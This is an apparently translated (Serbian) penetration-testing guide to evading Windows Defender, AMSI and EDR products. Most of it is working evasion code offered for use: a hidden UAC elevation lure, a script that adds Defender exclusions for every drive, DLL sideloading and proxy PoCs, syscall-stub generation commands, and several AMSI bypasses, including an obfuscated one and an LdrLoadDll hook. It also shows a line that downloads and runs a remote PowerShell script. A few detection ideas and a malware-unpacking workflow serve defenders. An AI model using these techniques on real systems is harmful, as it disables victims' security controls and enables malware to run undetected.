# Zaobilaženje antivirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defendera uz lažno predstavljanje drugog antivirusa.
- [Onemogućavanje Defendera ako imate administratorska prava](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalacionog programa pre menjanja Defendera

Javni loaderi koji se predstavljaju kao varalice za igre često se isporučuju kao nepotpisani Node.js/Nexe instalacioni programi koji najpre **traže od korisnika da im dodeli povišena ovlašćenja**, a tek onda onesposobljavaju Defender. Postupak je jednostavan:

1. Proverite da li je kontekst administratorski pomoću komande `net session`. Komanda uspeva samo kada pozivalac ima administratorska prava, pa neuspeh znači da se loader pokreće kao standardni korisnik.
2. Odmah ponovo pokrenite sam program pomoću glagola `RunAs` da biste pokrenuli očekivani UAC zahtev za potvrdu, uz očuvanje originalne komandne linije.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Žrtve već veruju da instaliraju „krekovan“ softver, pa se upit obično prihvata, čime se malveru daju potrebna prava da promeni Defender-ovu politiku.<sup>[[26]](#references)</sup>

### Sveobuhvatna `MpPreference` izuzeća za svako slovo diska

Kada dobije povišene privilegije, lanci nalik GachiLoader-u maksimalno iskorišćavaju slepe tačke Defender-a, umesto da potpuno onemoguće uslugu. Loader najpre gasi GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a zatim dodaje **izuzetno široka izuzeća** kako bi svaki korisnički profil, sistemski direktorijum i prenosivi disk postali nedostupni za skeniranje:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ključna zapažanja:

- Petlja prolazi kroz svaki montirani sistem datoteka (D:\, E:\, USB memorije itd.), pa se **zanemaruje svaki budući payload koji bude postavljen bilo gde na disku**.
- Isključivanje ekstenzije `.sys` namenjeno je budućim fazama — napadači zadržavaju mogućnost da kasnije učitaju nepotpisane drajvere bez ponovnog menjanja Defender podešavanja.
- Sve promene se upisuju u `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, pa kasnije faze mogu da potvrde da su isključenja sačuvana ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto nijedna Defender usluga nije zaustavljena, naivne provere stanja i dalje prijavljuju da je „antivirus aktivan“, iako zaštita u realnom vremenu ne proverava te putanje.<sup>[[26]](#references)</sup>

## **Metodologija za izbegavanje AV-a**

Trenutno AV rešenja koriste različite metode da provere da li je datoteka zlonamerna: statičku detekciju, dinamičku analizu i, kod naprednijih EDR rešenja, analizu ponašanja.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih zlonamernih nizova ili nizova bajtova u binarnoj datoteci ili skripti, kao i izdvajanjem informacija iz same datoteke (npr. opisa datoteke, naziva kompanije, digitalnih potpisa, ikone, kontrolne sume itd.). To znači da vas korišćenje poznatih javnih alata može lakše odati, jer su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da se zaobiđe ova vrsta detekcije:

- **Šifrovanje**

Ako šifrujete binarnu datoteku, AV neće moći da detektuje vaš program, ali će vam trebati neka vrsta loader-a koji će ga dešifrovati i pokrenuti u memoriji.

- **Obfuskacija**

Ponekad je dovoljno da izmenite neke nizove u binarnoj datoteci ili skripti da biste zaobišli AV, ali to može oduzeti mnogo vremena, u zavisnosti od toga šta pokušavate da obfuscate-ujete.

- **Razvoj sopstvenih alata**

Ako razvijate sopstvene alate, neće postojati poznati zlonamerni potpisi, ali za to je potrebno mnogo vremena i truda.

> [!TIP]
> Dobar alat za proveru statičke detekcije u Windows Defender-u je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On deli datoteku na više segmenata i traži od Defender-a da svaki skenira zasebno. Tako može tačno da vam pokaže koji nizovi ili bajtovi u binarnoj datoteci su označeni.

Toplo preporučujem da pogledate ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom izbegavanju AV-a.

### **Dinamička analiza**

Dinamička analiza je postupak u kojem AV pokreće vašu binarnu datoteku u sandbox-u i prati zlonamerne aktivnosti (npr. pokušaje dešifrovanja i čitanja lozinki iz pregledača, pravljenje minidump-a LSASS-a itd.). Sa ovim može biti malo teže raditi, ali evo nekoliko stvari koje možete da uradite da biste izbegli sandbox-ove.

- **Sačekajte pre izvršavanja** U zavisnosti od implementacije, ovo može biti odličan način da zaobiđete dinamičku analizu AV-a. AV rešenja imaju veoma malo vremena za skeniranje datoteka, kako ne bi ometala korisnikov rad, pa duga čekanja mogu poremetiti analizu binarnih datoteka. Problem je u tome što mnogi AV sandbox-ovi mogu jednostavno da preskoče čekanje, u zavisnosti od implementacije.
- **Provera resursa računara** Sandbox-ovi obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli da uspore korisnikov računar. Ovde možete biti i veoma kreativni, na primer proverom temperature CPU-a ili čak brzine ventilatora — u sandbox-u neće biti implementirano baš sve.
- **Provere specifične za računar** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu „contoso.local“, možete proveriti domen računara i uporediti ga sa navedenim. Ako se ne poklapa, program može da se zatvori.

Ispostavlja se da se računar u Microsoft Defender sandbox-u zove HAL9TH. Zato pre detonacije možete da proverite naziv računara u svom malware-u: ako se naziv poklapa sa HAL9TH, to znači da ste u Defender sandbox-u i program može da se zatvori.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za izbegavanje sandbox-ova

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanal #malware-dev</p></figcaption></figure>

Kao što smo već rekli u ovoj objavi, **javni alati** će pre ili kasnije **biti detektovani**, pa bi trebalo da se zapitate:

Na primer, ako želite da napravite dump LSASS-a, **da li zaista morate da koristite mimikatz**? Ili biste mogli da upotrebite neki manje poznat projekat koji takođe pravi dump LSASS-a?

Verovatno je ovo drugo pravi odgovor. Uzmimo mimikatz za primer: verovatno je jedan od najčešće označavanih malware alata, ako ne i najčešće označavan, u AV i EDR rešenjima. Sam projekat je veoma zanimljiv, ali je ujedno i prava noćna mora za korišćenje pri pokušaju zaobilaženja AV-a, zato potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada prilagođavate payload-e radi izbegavanja detekcije, obavezno **isključite automatsko slanje uzoraka** u Defender-u i, molim vas, zaista, **NEMOJTE OTPREMATI DATOTEKE NA VIRUSTOTAL** ako dugoročno želite da izbegnete detekciju. Ako želite da proverite da li određeni AV detektuje vaš payload, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXE datoteke naspram DLL datoteka

Kad god je moguće, uvek **dajte prednost DLL datotekama radi izbegavanja detekcije**. Prema mom iskustvu, DLL datoteke se obično **mnogo ređe detektuju i analiziraju**, pa je to jednostavan trik koji u nekim slučajevima može da pomogne u izbegavanju detekcije (ako vaš payload može da se pokrene kao DLL, naravno).

Kao što možemo da vidimo na ovoj slici, DLL payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima stopu detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>poređenje na antiscan.me između uobičajenog Havoc EXE payload-a i uobičajenog Havoc DLL-a</p></figcaption></figure>

Sada ćemo pokazati nekoliko trikova pomoću kojih možete da učinite DLL datoteke mnogo neprimetnijim.

## DLL Sideloading i Proxying

**DLL Sideloading** iskorišćava redosled pretrage DLL datoteka koji koristi loader, tako što se ranjiva aplikacija i zlonamerni payload-i postave jedan pored drugog.

Možete da potražite programe podložne DLL Sideloading-u pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledeće PowerShell skripte:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ova komanda će ispisati listu programa u direktorijumu "C:\Program Files\\" koji su podložni DLL hijacking-u, kao i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **sami istražite programe koji su podložni DLL Hijacking/Sideloading-u**. Ako se pravilno izvede, ova tehnika je prilično neprimetna, ali ako koristite javno poznate programe koji podržavaju DLL Sideloading, lako možete biti uhvaćeni.

Samo postavljanje zlonamernog DLL-a sa imenom koje program očekuje neće pokrenuti vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku pod nazivom **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje preko proxy (i zlonamernog) DLL-a originalnom DLL-u. Tako se čuva funkcionalnost programa, a istovremeno omogućava pokretanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/).

Evo koraka koje sam pratio:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Poslednja komanda će nam dati 2 datoteke: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! Rekao bih da je ovo uspeh.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t-ov twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE), da biste detaljnije naučili o onome o čemu smo razgovarali.

### Zloupotreba prosleđenih izvoza (ForwardSideLoading)

Windows PE moduli mogu da izvoze funkcije koje su zapravo „forwarderi“: umesto da ukazuje na kod, izvoz sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivalac razrešava izvoz, Windows učitavač će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Važno ponašanje koje treba razumeti:
- Ako je `TargetDll` KnownDLL, učitava se iz zaštićenog KnownDLLs prostora imena (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji obuhvata direktorijum modula koji obavlja prosleđivanje.

Ovo omogućava indirektan sideloading primitiv: pronađite potpisani DLL koji izvozi funkciju prosleđenu modulu koji nije KnownDLL, a zatim smestite taj potpisani DLL u isti direktorijum kao DLL pod kontrolom napadača, nazvan tačno kao prosleđeni ciljni modul. Kada se pozove prosleđena funkcija, učitavač razrešava prosleđivanje i učitava vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen u Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nije KnownDLL, pa se pronalazi uobičajenim redosledom pretrage.

PoC (kopiraj-nalepi):
1) Kopirajte potpisani sistemski DLL u fasciklu u koju je moguće upisivati.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u istu fasciklu. Minimalni `DllMain` je dovoljan za izvršavanje koda; ne morate da implementirate prosleđenu funkciju da biste pokrenuli `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Aktivirajte prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Uočeno ponašanje:
- rundll32 (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader prati prosleđivanje do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, greška „missing API“ pojaviće se tek nakon što je `DllMain` već pokrenut

Saveti za traženje:
- Usredsredite se na prosleđene exports kod kojih ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Prosleđene exports možete nabrojati pomoću alata kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwardera da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove iz putanja koje nisu sistemske, a zatim učitavaju DLL-ove koji nisu KnownDLLs, sa istim osnovnim imenom, iz tog direktorijuma
- Upozorite na lance procesa/modula kao što je: `rundll32.exe` → `keyiso.dll` koja nije iz sistemske putanje → `NCRYPTPROV.dll` u putanjama u koje korisnik može da upisuje
- Sprovodite smernice za integritet koda (WDAC/AppLocker) i zabranite pisanje i izvršavanje u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je alat za payload-e namenjen zaobilaženju EDR-ova pomoću suspendovanih procesa, direktnih sistemskih poziva i alternativnih metoda izvršavanja`

Freeze možete koristiti za učitavanje i izvršavanje svog shellcode-a na prikriven način.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša: ono što funkcioniše danas može biti otkriveno sutra, zato se nikada ne oslanjajte samo na jedan alat; ako je moguće, pokušajte da povežete više tehnika za izbegavanje detekcije.

## Direct/Indirect Syscalls i razrešavanje SSN-ova (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hooks** na syscall stubove u `ntdll.dll`. Da biste zaobišli te hook-ove, možete generisati **direct** ili **indirect** syscall stubove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja zakačene ulazne tačke export-a.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (ugrađen)**: emituje instrukciju `syscall`/`sysenter`/`SVC #0` u generisanom stubu (ne pristupa `ntdll` export-u).
- **Indirect**: skače na postojeći **syscall gadget** unutar `ntdll`, tako da izgleda kao da prelaz u kernel potiče iz `ntdll` (korisno za izbegavanje heurističke detekcije); **randomized indirect** bira gadget iz grupe pri svakom pozivu.
- **Egg-hunt**: izbegava ugrađivanje statičkog niza opcode-ova `0F 05` na disk; pronalazi syscall niz tokom izvršavanja.

**Strategije za razrešavanje SSN-ova otporne na hook-ove:**
- **FreshyCalls (VA sort)**: zaključuje SSN-ove sortiranjem syscall stubova prema virtuelnim adresama umesto čitanjem bajtova stubova.
- **SyscallsFromDisk**: mapira čistu `\KnownDlls\ntdll.dll`, čita SSN-ove iz njenog `.text`, a zatim je odmapira (zaobilazi sve hook-ove u memoriji).
- **RecycledGate**: kombinuje zaključivanje SSN-ova sortiranjem VA adresa sa proverom opcode-ova kada je stub čist; ako je zakačen, vraća se na zaključivanje na osnovu VA adresa.
- **HW Breakpoint**: postavlja DR0 na instrukciju `syscall` i koristi VEH da uhvati SSN iz `EAX` tokom izvršavanja, bez parsiranja zakačenih bajtova.

Primer korišćenja SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči „[malver bez datoteka](https://en.wikipedia.org/wiki/Fileless_malware)“. U početku su AV rešenja mogla da skeniraju samo **datoteke na disku**, pa AV nije mogao ništa da uradi kako bi sprečio izvršavanje payload-a **direktno u memoriji**, jer nije imao dovoljno uvida u to.

AMSI funkcija je integrisana u sledeće Windows komponente.

- Kontrola korisničkog naloga ili UAC (podizanje privilegija za EXE, COM, MSI ili instalaciju ActiveX-a)
- PowerShell (skripte, interaktivna upotreba i dinamičko izvršavanje koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Ova funkcija omogućava antivirusnim rešenjima da pregledaju ponašanje skripti tako što izlaže njihov sadržaj u nešifrovanom i neofuskiranom obliku.

Pokretanje komande `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` izazvaće sledeće upozorenje u Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako se dodaju `amsi:` i putanja do izvršne datoteke iz koje je skripta pokrenuta, u ovom slučaju powershell.exe

Nismo upisali nijednu datoteku na disk, ali nas je AMSI ipak uhvatio u memoriji.

Pored toga, počevši od **.NET 4.8**, C# kod se takođe proverava kroz AMSI. To utiče čak i na `Assembly.Load(byte[])` za učitavanje radi izvršavanja u memoriji. Zato se za izvršavanje u memoriji preporučuje korišćenje starijih verzija .NET-a (kao što je 4.7.2 ili starija) ako želite da zaobiđete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuskacija**

Pošto AMSI uglavnom koristi statičke detekcije, izmena skripti koje pokušavate da učitate može biti dobar način da izbegnete detekciju.

Međutim, AMSI može da deobfuskuje skripte čak i ako imaju više slojeva obfuskacije, pa obfuskacija može biti loša opcija u zavisnosti od načina na koji je izvedena. Zbog toga zaobilaženje nije sasvim jednostavno. Ipak, ponekad je dovoljno promeniti nekoliko naziva promenljivih, pa sve zavisi od toga koliko je nešto označeno kao sumnjivo.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell-a (kao i cscript.exe, wscript.exe itd.), moguće ga je lako izmeniti čak i kada se izvršava kao neprivilegovani korisnik. Zbog ovog nedostatka u implementaciji AMSI-ja, istraživači su pronašli više načina da zaobiđu AMSI skeniranje.

**Izazivanje greške**

Prinudno izazivanje neuspeha inicijalizacije AMSI-ja (amsiInitFailed) dovešće do toga da se za trenutni proces ne pokrene skeniranje. Ovo je prvobitno objavio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio potpis kako bi sprečio širu upotrebu.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Sve što je bilo potrebno jeste jedan red PowerShell koda da bi AMSI postao neupotrebljiv u trenutnom PowerShell procesu. Naravno, sam AMSI je označio ovaj red, pa je potrebno napraviti određene izmene da bi se ova tehnika koristila.

Evo izmenjenog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Imajte na umu da će ovo verovatno biti označeno kada se ova objava pojavi, zato nemojte objavljivati nikakav kod ako vam je cilj da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/). Ona podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje unosa koji je dostavio korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Na taj način rezultat samog skeniranja vraća 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike za zaobilaženje AMSI-ja pomoću powershell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robusno zaobilaženje koje ne zavisi od jezika jeste postavljanje hook-a u korisničkom režimu na `ntdll!LdrLoadDll`, koji vraća grešku kada je traženi modul `amsi.dll`. Zbog toga se AMSI nikada ne učitava i u tom procesu se ne obavljaju skeniranja.<sup>[[23]](#references)</sup>

Osnovni prikaz implementacije (x64 pseudokod za C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Napomene
- Radi u PowerShell-u, WScript/CScript-u i prilagođenim loader-ima (sa svim što bi inače učitavalo AMSI).
- Kombinujte sa slanjem skripti preko stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli dugačke artefakte komandne linije.
- Primećeno je da ga koriste loader-i koje pokreću LOLBins (npr. `regsvr32` poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše skriptu za zaobilaženje AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše skriptu za zaobilaženje AMSI-ja, koja izbegava detekciju potpisa pomoću nasumično generisane korisnički definisane funkcije, promenljivih i izraza sa znakovima, a nasumično menja i veličinu slova u ključnim rečima PowerShell-a.

**Uklanjanje detektovanog potpisa**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da biste uklonili detektovani AMSI potpis iz memorije trenutnog procesa. Ovaj alat skenira memoriju trenutnog procesa u potrazi za AMSI potpisom, a zatim ga prepisuje NOP instrukcijama i tako ga efektivno uklanja iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Listu AV/EDR proizvoda koji koriste AMSI možete pronaći na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Korišćenje PowerShell verzije 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. Ovo može biti korisno u svrhe revizije i rešavanja problema, ali može predstavljati i **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Koristite Powershell verziju 2**: Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete učiniti ovako: `powershell.exe -version 2`
- **Koristite unmanaged PowerShell sesiju**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da biste hostovali PowerShell bez pokretanja `powershell.exe` (pristup koji koristi `powerpick` alata Cobalt Strike). Time se zaobilaze kontrole vezane konkretno za proces `powershell.exe`, ali se time ne onemogućavaju automatski AMSI, Script Block Logging niti sve druge PowerShell odbrane; pokrivenost zavisi od runtime okruženja i implementacije hosta.


## Obfuscation

> [!TIP]
> Nekoliko tehnika za obfuscation oslanja se na šifrovanje podataka, što povećava entropiju binarne datoteke i olakšava AV-ovima i EDR-ovima da je otkriju. Budite oprezni i možda primenite šifrovanje samo na određene delove koda koji su osetljivi ili ih je potrebno sakriti.

### Uklanjanje obfuscation zaštite sa .NET binarnih datoteka zaštićenih pomoću ConfuserEx

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove), uobičajeno je naići na nekoliko slojeva zaštite koji blokiraju dekompilatore i sandbox-ove. Tok rada u nastavku pouzdano **vraća IL koji je gotovo identičan originalnom**, a koji se zatim može dekompilirati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1.  Uklanjanje zaštite od neovlašćenih izmena – ConfuserEx šifruje svako *telo metode* i dešifruje ga unutar statičkog konstruktora *modula* (`<Module>.cctor`). Takođe menja PE checksum, zbog čega će svaka izmena srušiti binarnu datoteku. Koristite **AntiTamperKiller** da pronađete šifrovane tabele metapodataka, povratite XOR ključeve i prepišete čistu assembly datoteku:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi sopstvenog unpacker-a.

2.  Oporavak simbola / kontrolnog toka – prosledite *clean* fajl alatu **de4dot-cex** (fork alata de4dot prilagođen za ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – izaberite ConfuserEx 2 profil
     • de4dot će poništiti spljoštavanje toka kontrole, vratiti originalne prostore imena, klase i nazive promenljivih i dešifrovati konstantne stringove.

3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda laganim omotačima (poznatim i kao *proxy calls*) kako bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nakon ovog koraka trebalo bi da vidite uobičajene .NET API-je, kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprozirnih funkcija omotača (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite dobijeni binarni fajl u dnSpy-ju i potražite velike Base64 blobove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli *stvarni* payload.  Malware ga često skladišti kao TLV-kodirani niz bajtova inicijalizovan unutar `<Module>.byte_0`.

